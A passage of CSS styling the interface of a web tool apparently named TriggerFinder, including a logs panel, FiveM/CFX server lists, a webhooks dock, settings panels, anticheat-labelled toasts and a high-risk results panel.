 2.5em 0em 0 0em rgba(255,255,255, 0.2),
 1.75em 1.75em 0 0em rgba(255,255,255, 0.5),
 0em 2.5em 0 0em rgba(255,255,255, 0.7),
 -1.8em 1.8em 0 0em #ffffff,
 -2.6em 0em 0 0em rgba(255,255,255, 0.2),
 -1.8em -1.8em 0 0em rgba(255,255,255, 0.2);
 }
 75% {
 box-shadow: 0em -2.6em 0em 0em rgba(255,255,255, 0.2),
 1.8em -1.8em 0 0em rgba(255,255,255, 0.2),
 2.5em 0em 0 0em rgba(255,255,255, 0.2),
 1.75em 1.75em 0 0em rgba(255,255,255, 0.2),
 0em 2.5em 0 0em rgba(255,255,255, 0.5),
 -1.8em 1.8em 0 0em rgba(255,255,255, 0.7),
 -2.6em 0em 0 0em #ffffff,
 -1.8em -1.8em 0 0em rgba(255,255,255, 0.2);
 }
 87.5% {
 box-shadow: 0em -2.6em 0em 0em rgba(255,255,255, 0.2),
 1.8em -1.8em 0 0em rgba(255,255,255, 0.2),
 2.5em 0em 0 0em rgba(255,255,255, 0.2),
 1.75em 1.75em 0 0em rgba(255,255,255, 0.2),
 0em 2.5em 0 0em rgba(255,255,255, 0.2),
 -1.8em 1.8em 0 0em rgba(255,255,255, 0.5),
 -2.6em 0em 0 0em rgba(255,255,255, 0.7),
 -1.8em -1.8em 0 0em #ffffff;
 }
 }

 /* ===== Live Logs Panel ===== */
 #logs-container{
 margin-top: 14px;
 border-radius: 18px;
 background: rgba(0,0,0,.28);
 border: 1px solid rgba(255,0,0,.18);
 box-shadow: 0 18px 60px rgba(0,0,0,.65);
 backdrop-filter: blur(8px);
 overflow: hidden;
 }
 .logs-head{
 display:flex; align-items:center; justify-content:space-between; gap:10px;
 padding: 10px 12px;
 border-bottom: 1px solid rgba(255,255,255,.10);
 background: rgba(255,255,255,.03);
 }
 .logs-title{font-weight:800; letter-spacing:1px; opacity:.92; display:flex; align-items:center; gap:8px}
 .logs-actions{display:flex; gap:8px}
 .logs-btn{
 padding:8px 10px; border-radius:12px;
 background: rgba(255,255,255,.06);
 border:1px solid rgba(255,255,255,.12);
 color:#fff; cursor:pointer;
 font-family: var(--font-family);
 }
 .logs-btn:hover{border-color: rgba(255,0,0,.35)}
 #logs{
 max-height: 220px;
 overflow:auto;
 padding: 10px 12px;
 font-size: 12px;
 line-height: 1.55;
 font-family: var(--font-family);
 }
 .log-line{display:flex; gap:10px; padding:6px 0; border-bottom: 1px dashed rgba(255,255,255,.08)}
 .log-line:last-child{border-bottom:none}
 .log-time{opacity:.55; min-width: 68px}
 .log-msg{opacity:.92; flex:1}
 .log-tag{
 min-width:70px; text-align:center;
 padding: 2px 8px; border-radius: 999px;
 border:1px solid rgba(255,255,255,.12);
 background: rgba(255,255,255,.06);
 font-size: 11px; opacity:.9;
 }
 .log-info .log-tag{border-color: rgba(0,180,255,.35); background: rgba(0,180,255,.10)}
 .log-ok .log-tag{border-color: rgba(0,255,140,.28); background: rgba(0,255,140,.10)}
 .log-warn .log-tag{border-color: rgba(255,200,0,.30); background: rgba(255,200,0,.10)}
 .log-err .log-tag{border-color: rgba(255,0,0,.35); background: rgba(255,0,0,.12)}

 /* ===== CFX card ===== */
 .h89-cfx-card{
 padding:12px;
 border-radius:16px;
 border:1px solid rgba(255,255,255,.10);
 background: rgba(0,0,0,.22);
 }
 .h89-cfx-title{font-weight:900; letter-spacing:.5px}
 .h89-cfx-meta{opacity:.75; font-size:12px; margin-top:4px}
 .h89-cfx-grid{
 display:grid;
 grid-template-columns: 1fr 1fr;
 gap:10px;
 }
 .h89-cfx-kv{
 padding:10px;
 border-radius:14px;
 border:1px solid rgba(255,255,255,.10);
 background: rgba(255,255,255,.03);
 display:flex; align-items:center; justify-content:space-between; gap:10px;
 min-width:0;
 }
 .h89-cfx-kv b{font-size:12px; opacity:.85}
 .h89-cfx-kv span{font-size:11px; opacity:.85; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; max-width:140px}
 @media (max-width: 980px){
 .h89-cfx-grid{grid-template-columns: 1fr}
 .h89-cfx-kv span{max-width:100%}
 }

 /* ===== Modal (CFX switch) ===== */
 .h89-modal{position:fixed; inset:0; z-index:99999; display:none;}
 .h89-modal[aria-hidden="false"]{display:block;}
 .h89-modal-backdrop{position:absolute; inset:0; background:rgba(0,0,0,.65); backdrop-filter: blur(6px);}
 .h89-modal-panel{
 position:relative;
 width:min(900px, calc(100% - 28px));
 margin: 40px auto;
 border-radius: 22px;
 border: 1px solid rgba(255,0,0,.25);
 background: rgba(10,10,10,.88);
 box-shadow: 0 25px 80px rgba(0,0,0,.65);
 overflow:hidden;
 }
 .h89-modal-head{
 padding:16px 18px;
 display:flex;
 align-items:center;
 gap:12px;
 border-bottom:1px solid rgba(255,255,255,.08);
 }
 .h89-modal-title{font-weight:900; letter-spacing:.6px; color:#ff2b2b;}
 .h89-modal-sub{opacity:.75; font-size:12px; flex:1; min-width:0; overflow:hidden; text-overflow:ellipsis; white-space:nowrap;}
 .h89-modal-body{padding:16px 18px 18px;}

 /* ===== CFX (modal) extras ===== */
 .h89-cfx-loading{display:flex; gap:10px; align-items:center;}
 .h89-cfx-error{border:1px solid rgba(255,0,0,.35); background: rgba(255,0,0,.10); padding:10px 12px; border-radius:12px; color:#ffb3b3;}
 .h89-cfx-player-list{max-height: 320px; overflow:auto; border:1px solid rgba(255,255,255,.08); border-radius:14px; padding:10px; background: rgba(0,0,0,.18);}
 .h89-cfx-player{display:flex; justify-content:space-between; align-items:center; padding:10px 12px; border-radius:12px; border:1px solid rgba(255,255,255,.06); background: rgba(0,0,0,.18); margin-bottom:8px;}
 .h89-cfx-player:last-child{margin-bottom:0;}
 .h89-cfx-pname{font-weight:800; letter-spacing:.2px;}
 .h89-cfx-pmeta{opacity:.65; font-size:12px; margin-top:2px;}
 .h89-cfx-badge{display:inline-flex; align-items:center; gap:6px; padding:4px 10px; border-radius:999px; border:1px solid rgba(255,255,255,.14); background: rgba(255,255,255,.06); font-size:12px; font-weight:800; opacity:.95;}
 .h89-cfx-badges{display:flex; gap:8px; flex-wrap:wrap; margin-top:6px;}
 .h89-cfx-player-right{display:flex; align-items:center; gap:8px;}
.h89-cfx-player-right{opacity:.9; font-weight:700;}
 .h89-cfx-empty{opacity:.75; padding:12px; text-align:center;}

 /* ===== Quick server list (CFX) ===== */
 .h89-cfx-wrap{display:grid; grid-template-columns: 240px 1fr; gap:16px;}
 .h89-cfx-quick{padding:12px; border-radius:18px; border:1px solid rgba(255,255,255,.10); background: rgba(0,0,0,.18); height: fit-content;}
 .h89-quick-list{display:flex; flex-direction:column; gap:8px; max-height: 420px; overflow:auto; padding-right:4px;}
 .h89-quick-item{
 text-align:left;
 padding:10px 12px;
 border-radius:12px;
 border:1px solid rgba(255,255,255,.10);
 background: rgba(255,255,255,.03);
 color: rgba(255,255,255,.92);
 font-weight:800;
 letter-spacing:.2px;
 cursor:pointer;
 transition: transform .12s ease, border-color .12s ease, background .12s ease;
 }
 .h89-quick-item:hover{transform: translateY(-1px); border-color: rgba(255,0,0,.35); background: rgba(255,0,0,.08);}
 .h89-quick-item.active{border-color: rgba(0,180,255,.55); background: rgba(0,180,255,.10); color: #bfefff;}
 @media (max-width: 860px){
 .h89-cfx-wrap{grid-template-columns: 1fr;}
 .h89-quick-list{max-height: 180px; flex-direction:row; flex-wrap:wrap;}
 .h89-quick-item{flex: 1 1 45%;}
 }

 /* Sidebar servers list height */
 #h89-main-servers{max-height: 260px;}

 /* ===== Settings panel ===== */
.settings-panel{
 position:fixed; right:20px; top:80px; width:280px;
 background:rgba(0,0,0,.9); border:1px solid rgba(255,0,0,.45);
 color:#fff; z-index:99999; border-radius:14px;

  /* ===== Toolbar theme variables ===== */
  --tb-bg: rgba(0,0,0,.45);
  --tb-border: rgba(255,0,0,.20);
  --tb-shadow: 0 18px 55px rgba(0,0,0,.65);
  --tb-badge-bg: rgba(255,0,0,.12);
  --tb-badge-border: rgba(255,0,0,.35);
  --tb-accent: #ff2a2a;
  --tb-muted: rgba(255,255,255,.65);

}
.settings-panel.hidden{display:none}
.settings-head{display:flex;justify-content:space-between;align-items:center;padding:12px 14px;border-bottom:1px solid rgba(255,255,255,.1)}
.settings-body{padding:12px 14px}
.setting{margin-bottom:10px}
.settings-note{opacity:.7;font-size:12px;margin-top:8px}

/* ===== Download FAB + Loader ===== */
#downloadFab{
 position:fixed;
 right:22px;
 bottom:92px; /* above settings */
 width:54px;height:54px;
 border-radius:50%;
 border:1px solid rgba(255,0,0,.55);
 background:rgba(0,0,0,.55);
 color:#fff;
 display:flex;
 align-items:center;
 justify-content:center;
 cursor:pointer;
 box-shadow:0 10px 30px rgba(0,0,0,.45);
 z-index:9999;
}
#downloadFab:hover{ background:rgba(0,0,0,.7); }
#downloadFab .fab-ico{ font-size:20px; line-height:1; }
#downloadFab.loading .fab-ico{ display:none; }
#downloadFab .fab-spin{
 display:none;
 width:18px;height:18px;
 border-radius:50%;
 border:2px solid rgba(255,255,255,.25);
 border-top-color:#fff;
 animation:h89Spin .8s linear infinite;
}
#downloadFab.loading .fab-spin{ display:block; }

@keyframes h89Spin{ to{ transform:rotate(360deg);} }

#downloadOverlay{
 position:fixed; inset:0;
 display:none;
 align-items:center;
 justify-content:center;
 background:rgba(0,0,0,.55);
 backdrop-filter: blur(6px);
 z-index:9998;
}
#downloadOverlay.show{ display:flex; }
#downloadOverlay .dl-box{
 padding:18px 20px;
 border-radius:14px;
 border:1px solid rgba(255,0,0,.35);
 background:rgba(0,0,0,.65);
 color:#fff;
 display:flex;
 gap:12px;
 align-items:center;
 font-family: inherit;
}

/* CFX favorites + embed */
.h89-quick-item{display:flex; align-items:center; justify-content:space-between; gap:10px;}
.h89-quick-item .h89-mini{padding:6px 10px; border-radius:10px;}
.h89-mini.is-active{background:rgba(255,0,0,.15); border-color:rgba(255,0,0,.55); color:#ff3b3b;}

/* --- Layout: put Webhooks panel on the LEFT side --- */
.scan-columns{
 display:grid;
 grid-template-columns: 360px 1fr;
 gap: 16px;
 align-items:start;
 margin-top: 14px;
}
.scan-columns .webhook-container{
 margin-top: 0 !important;
 position: sticky;
 top: 86px;
 max-height: calc(100vh - 120px);
 overflow: auto;
}
.scan-columns #results-container{
 margin-top: 0 !important;
}
@media (max-width: 980px){
 .scan-columns{
 grid-template-columns: 1fr;
 }
 .scan-columns .webhook-container{
 position: relative;
 top: auto;
 max-height: none;
 }
}

\1

<style id="h89-settings-css">
 /* --- UI Polish --- */
 .login-card, .login-box, #loginModal, .login-modal, .h89-login, .auth-card {
 backdrop-filter: blur(10px);
 -webkit-backdrop-filter: blur(10px);
 }
 .login-card, .auth-card, .login-box {
 animation: h89Pop .18s ease-out both;
 }
 @keyframes h89Pop { from { transform: translateY(8px) scale(.99); opacity: .0 } to { transform: translateY(0) scale(1); opacity: 1 } }

 /* Make labels consistent */
 label { letter-spacing: .4px; }

 /* --- Settings FAB --- */
 .h89-fab{
 position: fixed;
 right: 18px;
 bottom: 18px;
 z-index: 9999;
 width: 52px; height: 52px;
 border-radius: 16px;
 border: 1px solid rgba(255,0,0,.35);
 background: rgba(0,0,0,.55);
 color: #fff;
 font-size: 22px;
 cursor: pointer;
 box-shadow: 0 10px 30px rgba(0,0,0,.35);
 }
 .h89-fab:hover{ background: rgba(0,0,0,.7); }

 /* --- Settings Panel --- */
 .h89-settings{
 position: fixed;
 right: 18px;
 bottom: 80px;
 z-index: 9999;
 width: 320px;
 border-radius: 18px;
 border: 1px solid rgba(255,0,0,.25);
 background: rgba(0,0,0,.72);
 box-shadow: 0 14px 45px rgba(0,0,0,.45);
 backdrop-filter: blur(12px);
 -webkit-backdrop-filter: blur(12px);
 overflow: hidden;
 }
 .h89-settings.hidden{ display:none; }

 .h89-settings__head{
 display:flex;
 align-items:center;
 justify-content:space-between;
 padding: 12px 14px;
 border-bottom: 1px solid rgba(255,255,255,.07);
 }
 .h89-settings__title{
 font-weight: 700;
 letter-spacing: 1px;
 }
 .h89-settings__close{
 border: 1px solid rgba(255,255,255,.12);
 background: rgba(255,255,255,.06);
 color:#fff;
 border-radius: 10px;
 width: 34px; height: 34px;
 cursor:pointer;
 }

 .h89-settings__body{ padding: 12px 14px 14px; }
 .h89-setting{
 display:flex;
 align-items:center;
 justify-content:space-between;
 gap: 10px;
 padding: 10px 0;
 border-bottom: 1px dashed rgba(255,255,255,.06);
 }
 .h89-setting:last-child{ border-bottom:none; }
 .h89-setting__label{ font-size: 13px; opacity: .92; }
 .h89-setting__control{ display:flex; gap:8px; }

 .h89-chip{
 border: 1px solid rgba(255,255,255,.14);
 background: rgba(255,255,255,.06);
 color:#fff;
 padding: 7px 10px;
 border-radius: 999px;
 cursor:pointer;
 font-size: 12px;
 }
 .h89-chip.active{
 border-color: rgba(255,0,0,.45);
 background: rgba(255,0,0,.12);
 }

 .h89-toggle{
 position: relative;
 width: 44px; height: 24px;
 display:inline-block;
 }
 .h89-toggle input{ display:none; }
 .h89-toggle__ui{
 position:absolute; inset:0;
 background: rgba(255,255,255,.12);
 border: 1px solid rgba(255,255,255,.12);
 border-radius: 999px;
 transition: .15s ease;
 }
 .h89-toggle__ui::after{
 content:"";
 position:absolute; top: 2px; left: 2px;
 width: 18px; height: 18px;
 border-radius: 50%;
 background: rgba(255,255,255,.85);
 transition: .15s ease;
 }
 .h89-toggle input:checked + .h89-toggle__ui{
 background: rgba(255,0,0,.22);
 border-color: rgba(255,0,0,.35);
 }
 .h89-toggle input:checked + .h89-toggle__ui::after{
 transform: translateX(20px);
 background: rgba(255,255,255,.95);
 }
 .h89-settings__note{
 margin-top: 10px;
 font-size: 11px;
 opacity: .7;
 }

 /* Compact login mode */
 body.h89-compact-login .login-card,
 body.h89-compact-login .auth-card,
 body.h89-compact-login .login-box{
 transform: scale(.96);
 }

/* =========================
 H89 PRO UI POLISH PATCH
========================= */
:root{
 --pro-radius:16px;
 --pro-border:rgba(255,0,0,.22);
 --pro-border-2:rgba(255,255,255,.08);
 --pro-bg:rgba(0,0,0,.45);
 --pro-bg-2:rgba(0,0,0,.58);
 --pro-glow:rgba(255,0,0,.18);
 --pro-text:rgba(255,255,255,.92);
 --pro-muted:rgba(255,255,255,.62);
}
body{
 color:var(--pro-text);
 -webkit-font-smoothing:antialiased;
 text-rendering:optimizeLegibility;
}
.webhook-container,
#results-container,
.panel,.card,.section,
.h89-card,.h89-panel,
.modal-content,.h89-modal__panel{
 background:var(--pro-bg);
 border:1px solid var(--pro-border);
 border-radius:var(--pro-radius);
 box-shadow:0 10px 30px rgba(0,0,0,.45),
 inset 0 1px 0 var(--pro-border-2);
 backdrop-filter:blur(12px);
}
button,.btn,.h89-btn,.top-btn{
 border-radius:14px;
 border:1px solid var(--pro-border);
 background:rgba(255,0,0,.10);
 color:var(--pro-text);
 transition:.12s ease;
}
button:hover,.btn:hover,.h89-btn:hover,.top-btn:hover{
 transform:translateY(-1px);
 background:rgba(255,0,0,.16);
 border-color:rgba(255,0,0,.35);
 box-shadow:0 10px 26px var(--pro-glow);
}
input,textarea,select,.h89-input{
 border-radius:14px;
 border:1px solid rgba(255,255,255,.12);
 background:rgba(255,255,255,.04);
 color:var(--pro-text);
}
*::-webkit-scrollbar{width:10px}
*::-webkit-scrollbar-thumb{
 background:rgba(255,0,0,.22);
 border-radius:999px;
}

/* ===== Card Toast Notifications (FiveGuard/ElectronAC) ===== */
#h89-toasts{
 position: fixed;
 top: 20px;
 left: 50%;
 transform: translateX(-50%);
 z-index: 99999;
 display: flex;
 flex-direction: column;
 gap: 14px;
 width: min(720px, calc(100% - 28px));
 pointer-events: none;
}
.h89-toast{
 pointer-events: auto;
 position: relative;
 display: flex;
 align-items: stretch;
 background: #ffffff;
 color: #111827;
 border-radius: 14px;
 border: 1px solid rgba(17,24,39,.08);
 box-shadow: 0 16px 40px rgba(0,0,0,.12);
 overflow: hidden;
}
.h89-toast .bar{ width: 10px; flex:0 0 10px; }
.h89-toast .content{ padding: 14px 52px 14px 16px; display:flex; flex-direction:column; gap:4px; flex:1; min-width:0; }
.h89-toast .title{ font-weight:800; font-size:18px; line-height:1.1; }
.h89-toast .body{ font-size:13px; line-height:1.35; color: rgba(17,24,39,.75); white-space:pre-line; word-break: break-word; }
.h89-toast .x{
 position:absolute; right:14px; top:50%; transform: translateY(-50%);
 width:34px; height:34px; border-radius:999px;
 border:1px solid rgba(17,24,39,.12);
 background: rgba(255,255,255,.9);
 color: rgba(17,24,39,.7);
 cursor:pointer;
}
.h89-toast .x:hover{ color: rgba(17,24,39,.95); border-color: rgba(17,24,39,.22); }
.h89-toast.fiveguard .bar{ background:#ef4444; }
.h89-toast.electronac .bar{ background:#2563eb; }
@media (max-width:520px){ #h89-toasts{width:calc(100% - 18px);} .h89-toast .title{font-size:16px;} }


@keyframes cfxspin{to{transform:rotate(360deg)}}

/* ===== Upload UI (patched) ===== */
.upload-box{display:flex;align-items:center;gap:12px;padding:12px 14px;border:1px dashed #ff2a2a;border-radius:10px;background:linear-gradient(180deg,#0b0b0b,#050505);margin:10px 0;}
.upload-btn{background:linear-gradient(135deg,#ff1e1e,#b30000);border:none;color:#fff;padding:8px 16px;border-radius:8px;cursor:pointer;font-weight:600;white-space:nowrap;}
.upload-btn:hover{filter:brightness(1.1);}
.file-count{color:#aaa;font-size:13px;}


/* ===== Progress Bar v2 (top meta + track) ===== */
#progress-container.progress-v2{
  width: 100%;
  margin-top: 1rem;
  display: none;
  border-radius: 14px;
  border: 1px solid rgba(255,42,42,.28);
  background: rgba(10,10,10,.75);
  padding: 10px 12px 12px;
  overflow: hidden;
}
#progress-container.progress-v2 .progress-top{
  display:flex;
  justify-content:space-between;
  align-items:flex-start;
  gap: 12px;
  margin-bottom: 10px;
}
#progress-container.progress-v2 .progress-label{
  display:block;
  color:#fff;
  font-weight:700;
  font-size: 13px;
  letter-spacing: .2px;
}
#progress-container.progress-v2 .progress-sub{
  display:block;
  color:#8f8f8f;
  font-size: 12px;
  margin-top: 2px;
}
#progress-container.progress-v2 .progress-right{
  display:flex;
  align-items:center;
  gap: 10px;
  color:#bdbdbd;
  font-size: 12px;
}
#progress-container.progress-v2 .progress-percent{
  padding: 3px 9px;
  border-radius: 999px;
  border: 1px solid rgba(255,42,42,.35);
  background: rgba(255,42,42,.10);
  color:#ff6b6b;
  font-weight: 800;
  min-width: 56px;
  text-align:center;
}
#progress-container.progress-v2 .progress-track{
  width:100%;
  height: 12px;
  background: rgba(255,255,255,.06);
  border-radius: 999px;
  overflow:hidden;
  border: 1px solid rgba(255,255,255,.08);
}
#progress-container.progress-v2 #progress-bar{
  width: 0%;
  height: 100%;
  background: linear-gradient(90deg, var(--primary-color), var(--accent-color));
  border-radius: 999px;
  transition: width 0.18s linear;
  position: relative;
  overflow: hidden;
}
#progress-container.progress-v2 #progress-bar::after{
  content:'';
  position:absolute;
  inset:0;
  left:-100%;
  width:100%;
  height:100%;
  background: linear-gradient(90deg, transparent, rgba(255,255,255,0.22), transparent);
  animation: shimmer 1.6s infinite;
}
#progress-container.progress-v2 #progress-bar-text{
  position:absolute;
  right: 10px;
  top: 50%;
  transform: translateY(-50%);
  font-size: 11px;
  font-weight: 800;
  color: rgba(255,255,255,.92);
  text-shadow: 0 1px 4px rgba(0,0,0,.55);
}


/* ===== Advanced Filters Panel ===== */
.h89-filters-panel{
  position: sticky;
  top: 58px;
  z-index: 40;
  margin: 10px 0 0;
  padding: 12px 14px;
  border-radius: 14px;
  background: rgba(10,10,10,.92);
  border: 1px solid var(--tb-border, rgba(255,42,42,.25));
  box-shadow: 0 16px 45px rgba(0,0,0,.55);
  display: none;
}
.h89-filters-panel.show{ display:block; }

.h89-filters-head{
  display:flex;
  align-items:center;
  justify-content: space-between;
  margin-bottom: 10px;
}
.h89-filters-title{
  display:flex;
  align-items:center;
  gap:10px;
  color:#fff;
  font-weight:800;
  letter-spacing:.3px;
}
.h89-filters-close{
  background: rgba(255,255,255,.04);
  border: 1px solid rgba(255,255,255,.10);
  color:#ddd;
  border-radius: 10px;
  padding: 6px 10px;
  cursor:pointer;
}
.h89-filters-close:hover{ filter:brightness(1.1); }

.h89-filters-grid{
  display:grid;
  grid-template-columns: 160px 220px 1fr;
  gap: 12px;
}
.h89-filters-field{
  display:flex;
  flex-direction: column;
  gap: 6px;
  color:#bdbdbd;
  font-size: 11px;
  letter-spacing: .35px;
  text-transform: uppercase;
}
.h89-filters-field select,
.h89-filters-field input{
  height: 36px;
  border-radius: 12px;
  background: rgba(255,255,255,.04);
  border: 1px solid rgba(255,255,255,.10);
  color:#fff;
  padding: 0 12px;
  outline: none;
}
.h89-filters-field select:focus,
.h89-filters-field input:focus{
  border-color: var(--tb-accent, #ff2a2a);
  box-shadow: 0 0 0 1px rgba(255,42,42,.25);
}

.h89-filters-wide{ grid-column: span 1; }

.h89-filters-actions{
  display:flex;
  justify-content:flex-end;
  gap: 10px;
  margin-top: 12px;
}
.h89-filters-btn{
  border-radius: 12px;
  padding: 8px 12px;
  background: rgba(255,255,255,.04);
  border: 1px solid rgba(255,255,255,.10);
  color:#fff;
  cursor:pointer;
}
.h89-filters-btn.primary{
  border-color: var(--tb-accent, #ff2a2a);
  background: rgba(255,42,42,.12);
}
.h89-filters-btn:hover{ filter:brightness(1.08); }

@media (max-width: 980px){
  .h89-filters-grid{ grid-template-columns: 1fr; }
  .h89-filters-wide{ grid-column: auto; }
}


/* ===== High-Risk Panel (v5.7) ===== */
#h89-highrisk-panel{
  margin: 12px 0 0 0;
  padding: 14px;
  border-radius: 16px;
  background: rgba(12,12,12,.75);
  border: 1px solid rgba(255,42,42,.25);
}
#h89-highrisk-panel .h89-panel-head{
  display:flex; align-items:center; gap:12px; flex-wrap:wrap;
  justify-content:space-between;
  margin-bottom: 12px;
}
#h89-highrisk-panel .h89-panel-title{font-size:14px; font-weight:800; color:#ff4d4d;}
#h89-highrisk-panel .h89-panel-sub{font-size:12px; color:#9a9a9a; flex:1; min-width:240px;}
#h89-highrisk-empty{
  padding: 10px 12px;
  border-radius: 12px;
  background: rgba(255,255,255,.03);
  border: 1px solid rgba(255,255,255,.08);
  color: #7f7f7f;
  font-size: 12px;
}
.h89-risk-list{display:flex; flex-direction:column; gap:10px; margin-top:12px;}
.h89-risk-row{
  display:flex; align-items:center; justify-content:space-between; gap:10px;
  padding: 10px 12px;
  border-radius: 14px;
  background: rgba(255,42,42,.08);
  border: 1px solid rgba(255,42,42,.45);
}
.h89-risk-left{display:flex; flex-direction:column; gap:2px; min-width:0;}
.h89-risk-name{font-size:13px; font-weight:800; color:#fff; white-space:nowrap; overflow:hidden; text-overflow:ellipsis;}
.h89-risk-reason{font-size:12px; color:#ff9a9a; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; max-width: 62vw;}
.h89-risk-actions{display:flex; gap:8px; align-items:center;}
.h89-risk-tags{display:flex; gap:6px; flex-wrap:wrap; align-items:center;}
.h89-risk-rtag{
  font-size:10px;
  padding:3px 7px;
  border-radius:7px;
  font-weight:900;
  letter-spacing:.4px;
  border:1px solid;
  line-height:1;
}
.h89-risk-rtag.obf{color:#ffb347; background:rgba(255,179,71,.12); border-color:rgba(255,179,71,.55);}
.h89-risk-rtag.ac{color:#ff4d4d; background:rgba(255,77,77,.14); border-color:rgba(255,77,77,.65);}
.h89-risk-rtag.ai{color:#9b7bff; background:rgba(155,123,255,.14); border-color:rgba(155,123,255,.55);}
.h89-risk-rtag.fg{color:#ff6b6b; background:rgba(255,107,107,.14); border-color:rgba(255,107,107,.6);}
.h89-risk-tag{
  font-size: 11px;
  padding: 4px 10px;
  border-radius: 999px;
  border: 1px solid rgba(255,42,42,.7);
  color: #ff4d4d;
  background: rgba(255,42,42,.15);
  font-weight:800;
}

</style>

<style>
 :root{
 --h89-accent:#ff1a1a;
 --h89-accent2:#b30000;
 --h89-motion:1;
 }
 /* Accent + motion wiring */
 .h89-accent{ color:var(--h89-accent); }
 .h89-btn, .chip, .stat-card, .panel, .webhook-card, .trigger-card, .h89-toggle__ui{
 transition: transform calc(160ms * var(--h89-motion)) ease,
 box-shadow calc(160ms * var(--h89-motion)) ease,
 background-color calc(200ms * var(--h89-motion)) ease,
 border-color calc(200ms * var(--h89-motion)) ease,
 opacity calc(160ms * var(--h89-motion)) ease;
 }
 .h89-btn:hover{ transform: translateY(-1px); box-shadow: 0 10px 30px rgba(0,0,0,.35); }
 .stat-card:hover, .webhook-card:hover, .trigger-card:hover{ transform: translateY(-2px); }

 /* Settings selects */
 .h89-select{
 width: 100%;
 background: rgba(255,255,255,.06);
 border: 1px solid rgba(255,0,0,.35);
 color: #e9e9e9;
 border-radius: 10px;
 padding: 10px 12px;
 outline: none;
 }
 .h89-select:focus{ border-color: var(--h89-accent); box-shadow: 0 0 0 3px rgba(255,26,26,.18); }

 /* Dock sizing (Wide Webhooks Panel) */
 body.h89-wide-dock .dock{
 grid-template-columns: 0.9fr 1.1fr;
 }
 body.h89-wide-dock .dock-left{ min-width: 360px; }
 body.h89-wide-dock .dock-right{ min-width: 420px; }
 @media (max-width: 1100px){
 body.h89-wide-dock .dock{ grid-template-columns: 1fr; }
 }

 /* Reduce motion */
 body.h89-reduce-motion *{
 animation-duration: 0.001ms !important;
 animation-iteration-count: 1 !important;
 transition-duration: 0.001ms !important;
 scroll-behavior: auto !important;
 }

/* ===== Resizable Webhooks Dock ===== */
:root{ --dockW: 460px; }
.scan-columns{ display:flex; gap:16px; align-items:stretch; }
.webhook-container{ flex: 0 0 var(--dockW); max-width: 720px; min-width: 320px; }
#results-container{ flex: 1 1 auto; min-width: 320px; }
.dock-resize-handle{
 width: 10px;
 cursor: col-resize;
 border-radius: 12px;
 background: rgba(255,255,255,0.06);
 border: 1px solid rgba(255,0,0,0.22);
}
@media (max-width: 1200px){
 .scan-columns{ flex-direction:column; }
 .dock-resize-handle{ display:none; }
 .webhook-container{ flex: 1 1 auto; max-width:none; min-width: 0; }
}

.h89-input{
 background: rgba(255,255,255,.04);
 border: 1px solid rgba(255,255,255,.12);
 color:#fff;
 padding:10px 12px;
 border-radius:12px;
 outline:none;
}
.h89-input:focus{ border-color: rgba(255,0,0,.45); box-shadow: 0 0 0 3px rgba(255,0,0,.12); }

/* =========================
 H89 PRO UI POLISH PATCH
========================= */
:root{
 --pro-radius:16px;
 --pro-border:rgba(255,0,0,.22);
 --pro-border-2:rgba(255,255,255,.08);
 --pro-bg:rgba(0,0,0,.45);
 --pro-bg-2:rgba(0,0,0,.58);
 --pro-glow:rgba(255,0,0,.18);
 --pro-text:rgba(255,255,255,.92);
 --pro-muted:rgba(255,255,255,.62);
}
body{
 color:var(--pro-text);
 -webkit-font-smoothing:antialiased;
 text-rendering:optimizeLegibility;
}
.webhook-container,
#results-container,
.panel,.card,.section,
.h89-card,.h89-panel,
.modal-content,.h89-modal__panel{
 background:var(--pro-bg);
 border:1px solid var(--pro-border);
 border-radius:var(--pro-radius);
 box-shadow:0 10px 30px rgba(0,0,0,.45),
 inset 0 1px 0 var(--pro-border-2);
 backdrop-filter:blur(12px);
}
button,.btn,.h89-btn,.top-btn{
 border-radius:14px;
 border:1px solid var(--pro-border);
 background:rgba(255,0,0,.10);
 color:var(--pro-text);
 transition:.12s ease;
}
button:hover,.btn:hover,.h89-btn:hover,.top-btn:hover{
 transform:translateY(-1px);
 background:rgba(255,0,0,.16);
 border-color:rgba(255,0,0,.35);
 box-shadow:0 10px 26px var(--pro-glow);
}
input,textarea,select,.h89-input{
 border-radius:14px;
 border:1px solid rgba(255,255,255,.12);
 background:rgba(255,255,255,.04);
 color:var(--pro-text);
}
*::-webkit-scrollbar{width:10px}
*::-webkit-scrollbar-thumb{
 background:rgba(255,0,0,.22);
 border-radius:999px;
}

</style>

<style>
 /* Disable built-in TriggerFinder login overlay (we use external Firebase+Discord gate) */
 #h89LoginOverlay{display:none !important; visibility:hidden !important; pointer-events:none !important;}
</style>

<style>
 .h89-guard-badge{
 margin-left: 8px;
 padding: 2px 8px;
 font-size: 11px;
 font-weight: 900;
 letter-spacing: .5px;
 border-radius: 999px;
 color: #fff;
 background: linear-gradient(135deg, #ff1a1a, #a80000);
 border: 1px solid rgba(255,0,0,.55);
 box-shadow: 0 0 12px rgba(255,0,0,.55);
 text-transform: uppercase;
 }
</style>

<style id="h89-discord-header-style">
 /* ---- H89 Discord Header Enhancements ---- */
 .h89-discord-wrap{
 display:inline-flex;
 align-items:center;
 gap:10px;
 padding:6px 10px;
 border-radius:999px;
 background:rgba(0,0,0,.30);
 border:1px solid rgba(255,255,255,.10);
 backdrop-filter: blur(8px);
 cursor:pointer;
 user-select:none;
 }
 .h89-discord-wrap:hover{border-color:rgba(255,45,45,.45)}
 .h89-discord-avatar{
 width:26px;height:26px;border-radius:999px;
 border:1px solid rgba(255,255,255,.14);
 background:rgba(255,255,255,.06);
 object-fit:cover;
 }
 .h89-discord-name{
 font-weight:700;
 opacity:.95;
 white-space:nowrap;
 }
 .h89-expiry-badge{
 font-size:11px;
 padding:2px 8px;
 border-radius:999px;
 border:1px solid rgba(255,255,255,.12);
 background:rgba(255,255,255,.06);
 opacity:.9;
 }
 .h89-expiry-badge.warn{border-color:rgba(255,45,45,.6); background:rgba(255,45,45,.12)}
 .h89-expiry-badge.ok{border-color:rgba(27,217,106,.6); background:rgba(27,217,106,.10)}
 .h89-header-anim{
 animation: h89FloatIn .65s ease-out both, h89Pulse 3.2s ease-in-out infinite;
 transform-origin:left center;
 }
 @keyframes h89FloatIn{
 from{opacity:0; transform: translateY(-10px) scale(.98)}
 to{opacity:1; transform: translateY(0) scale(1)}
 }
 @keyframes h89Pulse{
 0%,100%{box-shadow: 0 0 0 rgba(255,45,45,0)}
 50%{box-shadow: 0 0 18px rgba(255,45,45,.18)}
 }
 .h89-dd{
